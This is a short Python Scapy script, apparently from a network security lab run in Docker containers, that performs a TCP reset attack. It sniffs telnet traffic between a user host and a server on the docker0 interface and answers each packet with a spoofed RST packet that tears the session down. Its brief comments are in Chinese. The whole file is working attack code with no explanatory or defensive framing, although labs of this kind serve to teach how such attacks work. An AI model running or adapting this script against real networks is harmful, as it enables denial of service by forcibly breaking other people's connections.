#!/usr/bin/python3
from scapy.all import *

user="172.17.0.2"
server="172.17.0.3"
attacker="172.17.0.4"

PORT = 23

def spoof(pkt):
	old_tcp = pkt[TCP]
	old_ip  = pkt[IP]
	
    #避免截获自己抓的包
	if old_tcp.flags=="R":
		return 
	#ls(pkt)
	ip_new  = IP(src=old_ip.src,dst=old_ip.dst)
	tcp_new = TCP(sport=old_tcp.sport, dport=old_tcp.dport,flags="R",seq=old_tcp.seq)
	pkt = ip_new/tcp_new

	send(pkt,verbose=0)
	#print("Spoofed Packet: {} --> {}".format(ip.src, ip.dst))

f = 'tcp and src host {} and dst host {} and dst port {}'.format(user, server, PORT)

#必须要指定docker0才能抓到包，不知道为什么
iface='docker0'
sniff(filter=f,iface=iface, prn=spoof)
#sniff(filter=f, prn=spoof)
#sniff(prn=spoof)